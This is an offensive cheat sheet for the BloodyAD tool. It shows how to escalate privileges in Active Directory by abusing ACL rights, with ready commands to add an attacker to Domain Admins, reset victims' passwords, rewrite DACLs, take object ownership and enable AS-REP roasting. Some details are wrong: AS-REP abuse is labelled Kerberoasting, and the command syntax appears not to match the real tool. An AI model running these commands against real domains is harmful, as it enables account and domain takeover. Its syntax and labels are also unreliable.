**BloodyAD** is a post-exploitation tool designed to manipulate Active Directory permissions and perform privilege escalation by abusing ACLs (Access Control Lists). It allows attackers to interact with the domain via LDAP and modify key attributes in user, group, or domain objects.

The tool supports:

- `GenericAll`
- `GenericWrite`
- `WriteDACL`
- `WriteOwner`
- `AddSelf`
- `AllExtendedRights` (e.g., reset password)
- `PreAuthNotRequired` abuse (Kerberoasting)


---

## Installation

```bash
sudo apt install bloodyad
```


---

## Basic Syntax

```bash
python bloodyAD.py --host <DC_IP> -u <user> -p <password> -d <domain> [command] [options]
```

If using NTLM hash:

```bash
-H <LM:NTLM>
```


---

## Abuse Scenarios

#### Add User to a Group

Used when the attacker has:

- `GenericAll`
- `GenericWrite`
- `AddSelf` on a group

Adds a user (usually attacker) to a privileged group such as **Domain Admins**.

```bash
python bloodyAD.py --host 192.168.1.10 -u attacker -p pass -d domain.local add-user-to-group -a attacker -t "Domain Admins"
```

## Reset Another User’s Password

Used when the attacker has:

- ForceChangePassword (from AllExtendedRights)
- GenericAll

Allows password reset without knowing the current password.

```bash
python bloodyAD.py --host 192.168.1.10 -u attacker -p pass -d domain.local reset-password -a victim_user -P 'NewPass123!'
```

#### Abuse WriteDACL (Access Control List)

Used when the attacker has:

- `WriteDACL` on a user or group

Allows editing the object’s ACL to assign full control (`GenericAll`) to the attacker.
```bash
python bloodyAD.py --host 192.168.1.10 -u attacker -p pass -d domain.local write-dacl -a victim_user -t attacker -r GenericAll
```

#### Abuse WriteOwner (Object Ownership)

Used when the attacker has:

- `WriteOwner` on an object

Lets the attacker take ownership of the object, then modify its ACL.

```bash
python bloodyAD.py --host 192.168.1.10 -u attacker -p pass -d domain.local write-owner -a victim_user -t attacker
```


#### Set PreAuthNotRequired (AS-REP Roasting)

Used when the attacker has:

- `GenericWrite` or `GenericAll`

Disables Kerberos pre-auth for a user, enabling AS-REP roasting attacks to retrieve crackable TGT hashes.

```bash
python bloodyAD.py --host 192.168.1.10 -u attacker -p pass -d domain.local set-preauth -a target_user
```


---


## Summary of Rights and What They Enable

|Right|Description|Enables|
|---|---|---|
|`GenericAll`|Full control of object|Reset passwords, modify groups, change DACLs|
|`GenericWrite`|Write to any writable attribute|Set SPNs, change passwords, add `PreAuthNotRequired`|
|`WriteDACL`|Modify object's ACL|Grant privileges to attacker|
|`WriteOwner`|Change object ownership|Take control and modify DACL later|
|`AddSelf`|Add yourself to group|Escalate to privileged group|
|`ForceChangePassword`|Reset password w/o old one|Immediate account access|
|`PreAuthNotRequired`|Disable Kerberos pre-auth|AS-REP roasting|
